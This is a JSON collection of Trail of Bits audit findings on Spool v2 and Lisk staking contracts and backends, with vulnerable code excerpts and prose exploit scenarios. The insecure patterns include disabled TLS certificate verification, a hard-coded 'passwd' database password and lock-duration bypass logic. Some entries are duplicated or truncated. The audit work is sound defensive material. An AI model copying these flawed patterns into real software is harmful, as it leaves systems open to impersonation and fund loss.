j = 0; j < exchangeRates.length; j++) { flushFactors[i][j] = allocation.get(i) * strategyRatios[i][j] * PRECISION_MULTIPLIER / normalization; } } return flushFactors; } Figure 35.2: The calculateFlushFactors function in spool-v2-core/DepositManager.sol The statement calculating the value of normalization tries to access an index of the empty array and reverts with the Index out of bounds error, causing the deposit function to revert for every transaction thereafter. Exploit Scenario A Spool admin removes a strategy from a smart vault. Because of the presence of a ghost strategy, users deposit transactions into the smart vault revert with the Index out of bounds error. Recommendations Short term, modify the calculateFlushFactors function so that it skips ghost strategies in the loop used to calculate the value of normalization . Long term, review the entire codebase, check the eects of removing strategies from smart vaults, and ensure that all of the functionality works for smart vaults with one or more ghost strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "36. Issues with the management of access control roles in deployment script ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The deployment script does not properly manage or assign access control roles. As a result, the protocol will not work as expected, and the protocols contracts cannot be upgraded. The deployment script has multiple issues regarding the assignment or transfer of access control roles. It fails to grant certain roles and to revoke temporary roles on deployment:      Ownership of the ProxyAdmin contract is not transferred to an EOA, multisig wallet, or DAO after the system is deployed, making the smart contracts non-upgradeable. The DEFAULT_ADMIN_ROLE role is not transferred to an EOA, multisig wallet, or DAO after the system is deployed, leaving no way to manage roles after deployment. The ADMIN_ROLE_STRATEGY role is not assigned to the StrategyRegistry contract, which is required to grant the ROLE_STRATEGY role to a strategy contract. Because of this, new strategies cannot be registered. The ADMIN_ROLE_SMART_VAULT_ALLOW_REDEEM role is not assigned to the SmartVaultFactory contract, which is required to grant the ROLE_SMART_VAULT_ALLOW_REDEEM role to smartVault contracts. The ROLE_SMART_VAULT_MANAGER and ROLE_MASTER_WALLET_MANAGER roles are not assigned to the DepositManager and WithdrawalManager contracts, making them unable to move funds from the master wallet contract. We also found that the ROLE_SMART_VAULT_ADMIN role is not assigned to the smart vault owner when a new smart vault is created. This means that smart vault owners will not be able to manage their smart vaults. Exploit Scenario The Spool team deploys the smart contracts using the deployment script, but due to the issues described in this nding, the team is not able to perform the role management and upgrades when required. Recommendations Short term, modify the deployment script so that it does the following on deployment:     Transfers ownership of the proxyAdmin contract to an EOA, multisig wallet, or DAO Transfers the DEFAULT_ADMIN_ROLE role to an EOA, multisig wallet, or DAO Grants the required roles to the smart contracts Allow the SmartVaultFactory contract to grant the ROLE_SMART_VAULT_ADMIN role to owners of newly created smart vaults Long term, document all of the systems roles and interactions between components that require privileged roles. Make sure that all of the components are granted their required roles following the principle of least privilege to keep the protocol secure and functioning as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "37. Risk of DoS due to unbounded loops ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Guards and actions are run in unbounded loops. A smart vault creator can add too many guards and actions, potentially trapping the deposit and withdrawal functionality due to a lack of gas. The runGuards function calls all the congured guard contracts in a loop: function runGuards( address smartVaultId, RequestContext calldata context) external view { if (guardPointer[smartVaultId][context.requestType] == address (0)) { return ; } GuardDefinition[] memory guards = _readGuards(smartVaultId, context.requestType); for ( uint256 i; i < guards.length; ++i) { GuardDefinition memory guard = guards[i]; bytes memory encoded = _encodeFunctionCall(smartVaultId, guard, context); ( bool success, bytes memory data) = guard.contractAddress.staticcall(encoded); _checkResult(success, data, guard.operator, guard.expectedValue, i); } } Figure 37.1: The runGuards function in spool-v2-core/GuardManager.sol Multiple conditions can cause this loop to run out of gas:    The vault creator adds too many guards. One of the guard contracts consumes a high amount of gas. A guard starts consuming a high amount of gas after a specic block or at a specic state. If user transactions reach out-of-gas errors due to these conditions, smart vaults can become unusable, and funds can become stuck in the protocol. A similar issue aects the runActions function in the AuctionManager contract. Exploit Scenario Eve creates a smart vault with an upgradeable guard contract. Later, when users have made large deposits, Eve upgrades the guard contract to consume all of the available gas to trap user deposits in the smart vault for as long as she wants. Recommendations Short term, model all of the system's variable-length loops, including the ones used by runGuards and runActions , to ensure they cannot block contract execution within expected system parameters. Long term, carefully audit operations that consume a large amount of gas, especially those in loops.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "38. Unsafe casts throughout the codebase ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The codebase contains unsafe casts that could cause mathematical errors if they are reachable in certain states. Examples of possible unsafe casts are shown in gures 38.1 and 38.2. function flushSmartVault( address smartVault, uint256 flushIndex, address [] calldata strategies, uint16a16 allocation, address [] calldata tokens ) external returns (uint16a16) { [...] _flushShares[smartVault][flushIndex].flushSvtSupply = uint128(ISmartVault(smartVault).totalSupply()) ; return _strategyRegistry.addDeposits(strategies, distribution); } Figure 38.1: A possible unsafe cast in spool-v2-core/DepositManager.sol#L220 function syncDeposits( address smartVault, uint256 [3] calldata bag, // uint256 flushIndex, // uint256 lastDhwSyncedTimestamp, // uint256 oldTotalSVTs, address [] calldata strategies, uint16a16[2] calldata dhwIndexes, address [] calldata assetGroup, SmartVaultFees calldata fees ) external returns (DepositSyncResult memory ) { [...] if (syncResult.mintedSVTs > 0) { _flushShares[smartVault][bag[0]].mintedVaultShares = uint128 (syncResult.mintedSVTs) ; [...] } return syncResult; } Figure 38.2: A possible unsafe cast in spool-v2-core/DepositManager.sol#L243 Recommendations Short term, review the codebase to identify all of the casts that may be unsafe. Analyze whether these casts could be a problem in the current codebase and, if they are unsafe, make the necessary changes to make them safe. Long term, when implementing potentially unsafe casts, always include comments to explain why those casts are safe in the context of the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Users can bypass the minimum lock duration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "Users can bypass the 14-day minimum lock duration by depositing a small amount of LSK tokens, initiating a fast unlock of their positions, and then depositing more tokens. The L2Staking contract allows users to initiate a fast unlock of their positions in order to be able to withdraw their locked LSK tokens early (gure 1.1). This action charges a penalty to the user proportional to their locked amount and the remaining lock duration, and sets the positions lock duration to three days (gure 1.2). function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(remainingLockingDuration(lock) > FAST_UNLOCK_DURATION, \"L2Staking: less than 3 days until unlock\"); // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; // update locking position (IL2LockingPosition(lockingPositionContract)).modifyLockingPosition(lockId, amount, expDate, 0); if (lock.creator == address(this)) { // send penalty amount to the Lisk DAO Treasury contract bool success = IERC20(l2LiskTokenContract).transfer(daoTreasury, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to DAO failed\"); } else { // send penalty amount to the creator bool success = IERC20(l2LiskTokenContract).transfer(lock.creator, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to creator failed\"); } return penalty; } Figure 1.1: The initiateFastUnlock function in L2Staking.sol#L285312 function calculatePenalty(uint256 amount, uint256 remainingDuration) internal view virtual returns (uint256) { if (emergencyExitEnabled) { return 0; } return (amount * remainingDuration) / (MAX_LOCKING_DURATION * PENALTY_DENOMINATOR); } Figure 1.2: The calculatePenalty function in L2Staking.sol#L142148 However, users that have initiated a fast unlock are still able to add to their positions locked amount through the increaseLockingAmount function, since this function veries only that the position is not expired (gure 1.3). function increaseLockingAmount(uint256 lockId, uint256 amountIncrease) public virtual { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(amountIncrease > 0, \"L2Staking: increased amount should be greater than zero\"); require( lock.pausedLockingDuration > 0 || lock.expDate > todayDay(), \"L2Staking: can not increase amount for expired locking position\" ); [...] } Figure 1.3: The increaseLockingAmount function in L2Staking.sol#L317338 Users could exploit this validation issue to bypass the minimum 14-day lock duration. Specically, a user could deposit a very small amount and then initiate a fast unlock of the position, reducing the positions lock duration to three days for a negligible penalty. The user could then call increaseLockingAmount to deposit the larger amount of funds they intended to deposit, leaving with a lock duration of only three days for very little cost. Exploit Scenario Alice wants to deposit 100,000 LSK tokens in order to gain a large amount of voting power; however, she does not want to have to lock her position for 14 days. She takes the following actions to reduce her lock duration: 1. Deposits the minimum amount of LSK tokens (0.01 LSK) for the minimum duration (14 days) 2. Initiates a fast unlock of her position and pays a small penalty (0.0028 LSK) to reduce the positions lock duration to three days 3. Deposits 100,000 LSK to her position Her position is now locked for three days instead of the minimum 14 days, and she has paid a negligible penalty for this benet. Recommendations Short term, add a check to the increaseLockingAmount function that ensures positions that have a lock duration of less than the minimum cannot be increased. Long term, dene a list of function- and system-level invariants and use advanced testing techniques such as smart contract fuzzing with Echidna, Medusa, or Foundry invariant testing to verify that the invariants hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Removing L2Reward from allowedCreators will freeze all positions created through the contract ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "If the L2Reward contract is removed from the L2Staking contracts allowedCreators mapping, all positions that were created through L2Reward will be frozen until it is re-added. The owner of the L2Staking contract is able to add and remove addresses from the allowedCreators mapping at any time (gure 2.1). This feature enables users to create their positions through an external contract (i.e., the L2Reward contract) and prevents them from modifying their positions by directly calling the L2Staking contract. This is done to ensure that the internal accounting of the L2Reward contract is always correct and in sync with the L2Staking contracts internal state. function addCreator(address newCreator) public virtual onlyOwner { require(newCreator != address(0), \"L2Staking: creator address can not be zero\"); require(newCreator != address(this), \"L2Staking: Staking contract can not be added as a creator\"); allowedCreators[newCreator] = true; emit AllowedCreatorAdded(newCreator); } function removeCreator(address creator) public virtual onlyOwner { require(creator != address(0), \"L2Staking: creator address can not be zero\"); delete allowedCreators[creator]; emit AllowedCreatorRemoved(creator); } Figure 2.1: The addCreator and removeCreator functions in L2Staking.sol#L192206 All functions in the L2Staking contract use the canLockingPositionBeModified internal function as an access control mechanism. If a position was created through an external contract that is in the allowedCreators mapping, the position can be modied only by that contract. Further access controls are implemented in the L2Reward contract to ensure that only the owner of a position can modify it through the contract. function canLockingPositionBeModified( uint256 lockId, IL2LockingPosition.LockingPosition memory lock ) { internal view virtual returns (bool) address ownerOfLock = (IL2LockingPosition(lockingPositionContract)).ownerOf(lockId); bool condition1 = allowedCreators[msg.sender] && lock.creator == msg.sender; bool condition2 = ownerOfLock == msg.sender && lock.creator == address(this); if (condition1 || condition2) { return true; } return false; } Figure 2.2: The canLockingPositionBeModified function in L2Staking.sol#L119136 However, this feature also gives the contract owner the power to freeze all positions created through the L2Reward contract by simply removing the L2Reward contract address from the allowedCreators mapping. This issue applies to any address added to the allowedCreators mapping in the future. Exploit Scenario Alice creates a locked position by depositing 1 million LSK tokens through the L2Reward contract. The owner of the L2Staking contract removes the L2Reward contract from the allowedCreators mapping, preventing Alice and all other users who have created positions through L2Reward from modifying their positions and accessing their tokens. Recommendations Short term, implement an emergency withdrawal function that can be used only in the event that the L2Reward contract is removed from the allowedCreators mapping. Long term, create user-facing documentation outlining the powers of privileges of actors and all risks associated with interacting with the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing certicate validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "The client-side verication of the server certicate is disabled in the DB class, allowing for server impersonation and person-in-the-middle attacks when the DB_SSLMODE environment variable is set to true (gure 3.1). 20 21 22 23 24 25 26 27 process.env.DB_SSLMODE === 'true' ? { ssl: { }, require: true, rejectUnauthorized: false, } : {}, Figure 3.1: The setup of TLS in the DB classs constructor (lisk-token-claim/packages/claim-backend/src/db.ts#2027) Exploit Scenario An attacker poses as the PostgreSQL server and presents a fake certicate. Because verication of the server certicate is disabled, the attackers certicate is accepted, allowing him to interfere with communication. Recommendations Short term, re-enable TLS certicate verication in the DB class constructor. Review the TLS conguration to ensure it uses modern TLS protocol versions and ciphers. Long term, incorporate the Semgrep tool with the bypass-tls-verification rule in the CI/CD process to catch issues like this early on.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Synchronous function calls inside asynchronous functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "In multiple locations in the tree-builder component, synchronous functions are called inside asynchronous functions; for example, the synchronous fs.writeFileSync function is called inside the asynchronous createKeyPairs function (gure 4.1). Such calls will block the event loop and essentially defeat the purpose of asynchronicity. Since the event loop is single-threaded, blocking it will prevent all other asynchronous tasks from running concurrently. If an attacker can cause large les to be written, other users could be prevented from taking actions in the system, causing a denial of service. 7 export async function createKeyPairs(amount = 100) { // (...) 21 fs.writeFileSync('../../data/example/key-pairs.json', JSON.stringify(keys), 'utf-8'); 22 } Figure 4.1: A call to the fs.writeFileSync function inside of the async createKeyPairs function (lisk-token-claim/packages/tree-builder/src/applications/example/create_k ey_pairs.ts#722) Synchronous functions are called inside asynchronous functions in these other locations as well:  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L14-L14  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L29-L29  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L48-L48  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L14-L14  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L25-L25  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L43-L43  tree-builder/src/commands/example/index.ts#L42-L42  tree-builder/src/commands/generate-airdrop-merkle-tree/index.ts#L 103-L103  tree-builder/src/commands/generate-airdrop-merkle-tree/index.ts#L 70-L70  tree-builder/src/commands/generate-merkle-tree/index.ts#L52-L52  tree-builder/src/commands/generate-merkle-tree/index.ts#L82-L82  tree-builder/src/commands/generate-merkle-tree/index.ts#L85-L85 Recommendations Short term, replace all calls to synchronous functions inside asynchronous functions with their asynchronous equivalents. Long term, use the Semgrep tool with the custom Semgrep rule provided in appendix F in the CI/CD process to nd any other instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Hard-coded credentials ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "The claim-backend component sets the PostgreSQL password as an environment variable (gure 5.1). The password is also checked into the source code (gure 5.2). Keeping secrets in environment variables is a well-known antipattern. Environment variables are commonly captured by all manner of debugging and logging information, can be accessed from procfs, and are passed down to all child processes. If attackers have access to the application source code, they would have access to the database password. Additionally, because the password is checked into the source code repository, all employees and contractors with access to the repository have access to the password. Credentials should never be stored in plaintext in source code repositories, as they can become valuable tools to attackers if the repositories are compromised. services: postgres: // (...) image: postgres environment: POSTGRES_USER: claim-backend POSTGRES_PASSWORD: passwd Figure 5.1: The PostgreSQL password set as an environment variable (lisk-token-claim/packages/claim-backend/docker-compose.yml#211) constructor() { this.models = [Signature]; this.sequelize = new Sequelize({ dialect: 'postgres', host: process.env.DB_HOST || '127.0.0.1', database: process.env.DB_DATABASE || 'claim-backend', username: process.env.DB_USERNAME || 'claim-backend', password: process.env.DB_PASSWORD || 'passwd', Figure 5.2: The database password is taken from the DB_PASSWORD environment variable or set to passwd if there is no environment variable. (lisk-token-claim/packages/claim-backend/src/db.ts#815) Exploit Scenario An attacker obtains a copy of the source code from a former employee. He extracts the PostgreSQL password and uses it to exploit Lisks products. Recommendations Short term, use a Docker secret in place of the environment variable for the PostgreSQL password, and remove the password from the source code; use Docker secrets instead of environment variables to pass any other sensitive information into containers moving forward. Long term, consider storing credentials in a secret management solution. Also, periodically use the TrueHog tool to detect secrets checked into the source code. References  GitHub Docs: Removing sensitive data from a repository",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Use of outdated libraries ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "We used npm audit to detect the use of outdated dependencies in the lisk-token-claim component, which identied the following vulnerable packages. Dependency Vulnerability Report Vulnerability",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Stack traces in Express are not disabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "The NODE_ENV environment variable is not set to production in the claim-backend component. As a result, the underlying Express web framework returns errors to the client along with a stack trace (gure 7.1), which exposes internal claim-backend paths and functions. (Express does not return stack traces in the production environment.) POST /rpc HTTP/1.1 Host: 127.0.0.1:3000 Content-Type: application/json Content-Length: 161 { } \"jsonrpc\": \"2.0\", \"method\": \"checkEligibility\", \"params\": { \"lskAddress\": \"lskfcu7z7sch46o67sq24v9h9df2h5o2juvjp3fjj\" }, \"id\": 1 HTTP/1.1 400 Bad Request // (...) <pre>SyntaxError: Unexpected token &#39; in JSON at position 160<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/node_modules/body-parser/lib/types/json.js:92:19)<br> &nbsp; &nbsp;at /node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/node_modules/raw-body/index.js:238:16)<br> &nbsp; &nbsp;at done (/node_modules/raw-body/index.js:227:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/node_modules/raw-body/index.js:287:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:517:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1400:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre> </body></html> Figure 7.1: An HTTP request that results in the Exploit Scenario An attacker uses the stack traces returned with errors from the Express web framework to identify internal paths and functions in the claim-backend component. This information allows him to prepare further exploits that target the claim-backend component. Recommendations Short term, set the NODE_ENV variable to production and check that stack traces are not returned (for example, when a request with intentionally malformed JSON in the body is sent to RPC). References  Express: Error Handling",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Docker Compose ports exposed on all interfaces ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "Docker ports are specied in the docker-compose.yml conguration le without a host. For example, ${DB_PORT}:5432 is specied for the PostgreSQL container (gure 8.1). This means that these ports are accessible not just to other processes running on the same computer, but also to other computers on the same network. 2 3 4 5 6 7 services: postgres: image: postgres restart: always ports: - '${DB_PORT}:5432' Figure 8.1: The PostgreSQL port is exposed on all interfaces. (lisk-token-claim/packages/claim-backend/docker-compose.yml#27) Recommendations Short term, set all conguration values in docker-compose.yml with both hosts and ports. For example, set the PostgreSQL port to ${DB_HOST}:${DB_PORT}:5432 instead of ${DB_PORT}:5432. Long term, use the port-all-interfaces Semgrep rule to detect and ag instances of this conguration pattern. References  Docker Docs: Networking in Compose",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Extending the duration of an expired position can break protocol accounting ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "An incorrect dailyUnlockedAmounts mapping key is used in the _extendDuration function. As a result, extending an expired position can break protocol accounting. The L2Reward contract allows users to extend the duration of their locked positions by passing an array of lock IDs to the extendDuration function, which calls the internal _extendDuration function for each lock ID. This function updates dierent global accounting values depending on whether the given position has expired (gure 9.1). function _extendDuration(uint256 lockID, uint256 durationExtension) internal virtual { IL2LockingPosition.LockingPosition memory lockingPosition = IL2LockingPosition(lockingPositionContract).getLockingPosition(lockID); // claim rewards and update staking contract _claimReward(lockID); IL2Staking(stakingContract).extendLockingDuration(lockID, durationExtension); // update globals totalWeight += lockingPosition.amount * durationExtension; if (lockingPosition.pausedLockingDuration == 0) { // locking period has not finished if (lockingPosition.expDate > todayDay()) { dailyUnlockedAmounts[lockingPosition.expDate] -= lockingPosition.amount; } // locking period has expired, re-lock amount else { totalAmountLocked += lockingPosition.amount; pendingUnlockAmount += lockingPosition.amount; totalWeight += lockingPosition.amount * OFFSET; } dailyUnlockedAmounts[lockingPosition.expDate + durationExtension] += lockingPosition.amount; } } Figure 9.1: The _extendDuration function in L2Reward.sol#L394L419 The highlighted line in gure 9.1 shows that the _extendDuration function uses the sum of the previous expiration date of the given position and the value of the durationExtension input variable as the dailyUnlockedAmounts mapping key. However, based on the extendLockingDuration function of the L2Staking contract, it is clear that the key used in _extendDuration is incorrect (gure 9.2). function extendLockingDuration(uint256 lockId, uint256 extendDays) public virtual { [...] if (lock.pausedLockingDuration > 0) { // remaining duration is paused lock.pausedLockingDuration += extendDays; } else { // remaining duration not paused, if expired, assume expDate is today lock.expDate = Math.max(lock.expDate, todayDay()) + extendDays; } [...] } Figure 9.2: The extendLockingDuration function in L2Staking.sol#L354360 If the position has expired and the sum of lockingPosition.expDate and durationExtension is less than or equal to the value of todayDay, the dailyUnlockedAmounts mapping will use a key that was already used to update the global state in the past. As a result, the values of the global state variables pendingUnlockAmount, totalAmountLocked, totalWeight, and cappedRewards will be incorrect. This can have the following consequences:  The dailyRewards limit could be incorrectly applied.  User rewards could be reduced if the totalWeight value is larger than it should be.  The updateGlobalState function could revert, freezing all user positions and assets. Exploit Scenario Alice deposits 10e18 LSK tokens, creating a position with a lock duration of 14 days. On day 16, she decides to extend her position by one day. Although her position is extended until day 17, the dailyUnlockedAmounts value is updated for day 15, causing the pendingUnlockAmount, totalAmountLocked, and totalWeight accounting values to be incorrect. Recommendations Short term, x the highlighted line of gure 9.1 by adding the line lockingPosition.expDate = Math.max(lockingPosition.expDate,todayDay()) to the else branch, above the highlighted line. Long term, improve the testing suite by adding unit and fuzz tests that verify that the values of the global state variables are correct. 10. Insu\u0000cient event generation Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-LSK2-10 Target: src/L2/L2Reward.sol, src/L2/L2Staking.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Users are charged a larger penalty for fast unlocks than necessary ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "The penalty calculation in the fast unlocking mechanism is incorrect and will charge users a higher penalty than what they truly owe. As shown in gure 11.1, the initiateFastUnlock function in the L2Staking contract allows users to reduce the lock duration of their positions to three days. Users incur a penalty for this action proportional to their locked amount and the remaining lock duration. function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { ... // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; ... } Figure 11.1: The initiateFastUnlock function in L2Staking.sol#L293296 However, the associated penalty calculation computes the penalty based on the remaining days of the lock duration from when the user initiates the fast unlock request, including the three-day period during which the position will still be locked. Recommendations Short term, replace the penalty calculation logic with the following: uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock) - FAST_UNLOCK_DURATION); Long term, perform a thorough review of the code to identify any potential logical calculation errors in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Users can bypass the minimum lock duration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "Users can bypass the 14-day minimum lock duration by depositing a small amount of LSK tokens, initiating a fast unlock of their positions, and then depositing more tokens. The L2Staking contract allows users to initiate a fast unlock of their positions in order to be able to withdraw their locked LSK tokens early (gure 1.1). This action charges a penalty to the user proportional to their locked amount and the remaining lock duration, and sets the positions lock duration to three days (gure 1.2). function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(remainingLockingDuration(lock) > FAST_UNLOCK_DURATION, \"L2Staking: less than 3 days until unlock\"); // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; // update locking position (IL2LockingPosition(lockingPositionContract)).modifyLockingPosition(lockId, amount, expDate, 0); if (lock.creator == address(this)) { // send penalty amount to the Lisk DAO Treasury contract bool success = IERC20(l2LiskTokenContract).transfer(daoTreasury, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to DAO failed\"); } else { // send penalty amount to the creator bool success = IERC20(l2LiskTokenContract).transfer(lock.creator, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to creator failed\"); } return penalty; } Figure 1.1: The initiateFastUnlock function in L2Staking.sol#L285312 function calculatePenalty(uint256 amount, uint256 remainingDuration) internal view virtual returns (uint256) { if (emergencyExitEnabled) { return 0; } return (amount * remainingDuration) / (MAX_LOCKING_DURATION * PENALTY_DENOMINATOR); } Figure 1.2: The calculatePenalty function in L2Staking.sol#L142148 However, users that have initiated a fast unlock are still able to add to their positions locked amount through the increaseLockingAmount function, since this function veries only that the position is not expired (gure 1.3). function increaseLockingAmount(uint256 lockId, uint256 amountIncrease) public virtual { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(amountIncrease > 0, \"L2Staking: increased amount should be greater than zero\"); require( lock.pausedLockingDuration > 0 || lock.expDate > todayDay(), \"L2Staking: can not increase amount for expired locking position\" ); [...] } Figure 1.3: The increaseLockingAmount function in L2Staking.sol#L317338 Users could exploit this validation issue to bypass the minimum 14-day lock duration. Specically, a user could deposit a very small amount and then initiate a fast unlock of the position, reducing the positions lock duration to three days for a negligible penalty. The user could then call increaseLockingAmount to deposit the larger amount of funds they intended to deposit, leaving with a lock duration of only three days for very little cost. Exploit Scenario Alice wants to deposit 100,000 LSK tokens in order to gain a large amount of voting power; however, she does not want to have to lock her position for 14 days. She takes the following actions to reduce her lock duration:",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Extending the duration of an expired position can break protocol accounting ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "An incorrect dailyUnlockedAmounts mapping key is used in the _extendDuration function. As a result, extending an expired position can break protocol accounting. The L2Reward contract allows users to extend the duration of their locked positions by passing an array of lock IDs to the extendDuration function, which calls the internal _extendDuration function for each lock ID. This function updates dierent global accounting values depending on whether the given position has expired (gure 9.1). function _extendDuration(uint256 lockID, uint256 durationExtension) internal virtual { IL2LockingPosition.LockingPosition memory lockingPosition = IL2LockingPosition(lockingPositionContract).getLockingPosition(lockID); // claim rewards and update staking contract _claimReward(lockID); IL2Staking(stakingContract).extendLockingDuration(lockID, durationExtension); // update globals totalWeight += lockingPosition.amount * durationExtension; if (lockingPosition.pausedLockingDuration == 0) { // locking period has not finished if (lockingPosition.expDate > todayDay()) { dailyUnlockedAmounts[lockingPosition.expDate] -= lockingPosition.amount; } // locking period has expired, re-lock amount else { totalAmountLocked += lockingPosition.amount; pendingUnlockAmount += lockingPosition.amount; totalWeight += lockingPosition.amount * OFFSET; } dailyUnlockedAmounts[lockingPosition.expDate + durationExtension] += lockingPosition.amount; } } Figure 9.1: The _extendDuration function in L2Reward.sol#L394L419 The highlighted line in gure 9.1 shows that the _extendDuration function uses the sum of the previous expiration date of the given position and the value of the durationExtension input variable as the dailyUnlockedAmounts mapping key. However, based on the extendLockingDuration function of the L2Staking contract, it is clear that the key used in _extendDuration is incorrect (gure 9.2). function extendLockingDuration(uint256 lockId, uint256 extendDays) public virtual { [...] if (lock.pausedLockingDuration > 0) { // remaining duration is paused lock.pausedLockingDuration += extendDays; } else { // remaining duration not paused, if expired, assume expDate is today lock.expDate = Math.max(lock.expDate, todayDay()) + extendDays; } [...] } Figure 9.2: The extendLockingDuration function in L2Staking.sol#L354360 If the position has expired and the sum of lockingPosition.expDate and durationExtension is less than or equal to the value of todayDay, the dailyUnlockedAmounts mapping will use a key that was already used to update the global state in the past. As a result, the values of the global state variables pendingUnlockAmount, totalAmountLocked, totalWeight, and cappedRewards will be incorrect. This can have the following consequences:  The dailyRewards limit could be incorrectly applied.  User rewards could be reduced if the totalWeight value is larger than it should be.  The updateGlobalState function could revert, freezing all user positions and assets. Exploit Scenario Alice deposits 10e18 LSK tokens, creating a position with a lock 